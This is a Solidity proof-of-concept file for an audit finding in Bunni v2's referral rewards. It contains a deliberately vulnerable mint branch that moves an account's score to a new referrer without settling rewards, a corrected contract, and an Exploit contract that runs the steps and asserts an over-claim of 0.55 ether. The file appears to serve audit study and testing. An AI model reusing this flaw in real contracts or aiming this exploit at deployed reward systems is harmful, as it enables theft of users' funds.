// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bunni v2 — C-06 (Pashov, August 2024)
    ERC20Referrer._mint(to, amount, referrer) moves an account's whole score
    onto a new referrer without settling that referrer's rewards. The moved
    score is counted again in claimReferralRewards. Referrer 2 collects 1.05
    ether after only 1 ether was distributed and referrer 1 already took 0.5.
*/

contract RewardToken {
    string public symbol = "FEE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Depositor {
    function mint(address token, address to, uint256 amount, uint24 referrer) external {
        BunniToken(token).mint(to, amount, referrer);
    }

    function approve(RewardToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}

contract BunniToken {
    RewardToken public reward;
    address public reserve;
    uint256 public acc;
    uint256 public totalScore;
    mapping(uint24 => uint256) public scoreOf;
    mapping(uint24 => uint256) public rewardDebt;
    mapping(uint24 => address) public referrerAddress;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint24) public referrerOf;

    constructor(RewardToken reward_) {
        reward = reward_;
    }

    function setReferrerAddress(uint24 id, address who) external {
        referrerAddress[id] = who;
    }

    function setReserve(address reserve_) external {
        reserve = reserve_;
    }

    /// @dev Blamed branch of ERC20Referrer._mint(to, amount, referrer).
    /// When the referrer changes, the old balance is subtracted from the old
    /// score and `updatedToBalance` (old balance + new mint) is added to the
    /// new referrer. Rewards are not settled first.
    function mint(address to, uint256 amount, uint24 referrer) external {
        uint256 toBalance = balanceOf[to];
        uint24 toReferrer = referrerOf[to];
        uint256 updatedToBalance = toBalance + amount;
        balanceOf[to] = updatedToBalance;
        referrerOf[to] = referrer;
        if (toReferrer != referrer) {
            if (toBalance != 0) {
                // @> VULN: the depositor's existing score is taken off the old referrer and given to the new one before that referrer's rewards are settled
                scoreOf[toReferrer] -= toBalance;
                totalScore -= toBalance;
                scoreOf[referrer] += updatedToBalance;
                totalScore += updatedToBalance;
            } else {
                scoreOf[referrer] += updatedToBalance;
                totalScore += updatedToBalance;
            }
        } else {
            scoreOf[referrer] += amount;
            totalScore += amount;
        }
    }

    function distributeReferralRewards(uint256 amount) external {
        require(totalScore > 0, "score");
        acc += amount * 1e18 / totalScore;
        require(reward.transferFrom(reserve, address(this), amount), "fund");
    }

    function claimable(uint24 referrer) public view returns (uint256) {
        return scoreOf[referrer] * acc / 1e18 - rewardDebt[referrer];
    }

    function claimReferralRewards(uint24 referrer) external returns (uint256 paid) {
        paid = claimable(referrer);
        rewardDebt[referrer] = scoreOf[referrer] * acc / 1e18;
        require(reward.transfer(referrerAddress[referrer], paid), "pay");
    }
}

contract BunniTokenFixed {
    RewardToken public reward;
    uint256 public acc;
    uint256 public totalScore;
    mapping(uint24 => uint256) public scoreOf;
    mapping(uint24 => uint256) public rewardDebt;
    mapping(uint24 => address) public referrerAddress;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint24) public referrerOf;

    constructor(RewardToken reward_) {
        reward = reward_;
    }

    function setReferrerAddress(uint24 id, address who) external {
        referrerAddress[id] = who;
    }

    function mint(address to, uint256 amount, uint24 referrer) external {
        uint256 toBalance = balanceOf[to];
        uint24 toReferrer = referrerOf[to];
        uint256 updatedToBalance = toBalance + amount;
        balanceOf[to] = updatedToBalance;
        referrerOf[to] = referrer;
        if (toReferrer != referrer) {
            if (toBalance != 0) {
                scoreOf[toReferrer] -= toBalance;
                totalScore -= toBalance;
                if (rewardDebt[toReferrer] > scoreOf[toReferrer] * acc / 1e18) {
                    rewardDebt[toReferrer] = scoreOf[toReferrer] * acc / 1e18;
                }
            }
            // Settle the destination referrer for the incoming score before it can earn past rewards.
            rewardDebt[referrer] += updatedToBalance * acc / 1e18;
            scoreOf[referrer] += updatedToBalance;
            totalScore += updatedToBalance;
        } else {
            rewardDebt[referrer] += amount * acc / 1e18;
            scoreOf[referrer] += amount;
            totalScore += amount;
        }
    }

    function distributeReferralRewards(uint256 amount) external {
        acc += amount * 1e18 / totalScore;
        require(reward.transferFrom(msg.sender, address(this), amount), "fund");
    }

    function claimable(uint24 referrer) public view returns (uint256) {
        return scoreOf[referrer] * acc / 1e18 - rewardDebt[referrer];
    }

    function claimReferralRewards(uint24 referrer) external returns (uint256 paid) {
        paid = claimable(referrer);
        rewardDebt[referrer] = scoreOf[referrer] * acc / 1e18;
        require(reward.transfer(referrerAddress[referrer], paid), "pay");
    }
}

contract Exploit {
    RewardToken public reward;
    BunniToken public bunni;
    Depositor public depositor;
    address public sink;
    uint256 public taken;
    uint256 public fair;

    constructor() {
        reward = new RewardToken();
        bunni = new BunniToken(reward);
        depositor = new Depositor();
        sink = address(new Depositor());
        bunni.setReferrerAddress(1, sink);
        bunni.setReferrerAddress(2, address(this));
        bunni.setReserve(address(depositor));
        depositor.approve(reward, address(bunni));
        // 1 ether is the real distribution. 0.55 ether is already in the reward contract.
        reward.mint(address(depositor), 1 ether);
        reward.mint(address(bunni), 0.55 ether);
    }

    function run() external {
        bunni.mint(address(this), 1 ether, 1);
        depositor.mint(address(bunni), address(depositor), 1 ether, 2);
        bunni.distributeReferralRewards(1 ether);
        uint256 first = bunni.claimReferralRewards(1);
        bunni.mint(address(this), 0.1 ether, 2);
        taken = bunni.claimReferralRewards(2);
        fair = 0.5 ether;
        require(first == 0.5 ether, "first");
        require(bunni.scoreOf(1) == 0, "score1");
        require(bunni.scoreOf(2) == 2.1 ether, "score2");
        require(taken == 1.05 ether, "overclaim");
        require(taken - fair == 0.55 ether, "double");
        require(reward.balanceOf(address(this)) == 1.05 ether, "balance");
    }
}
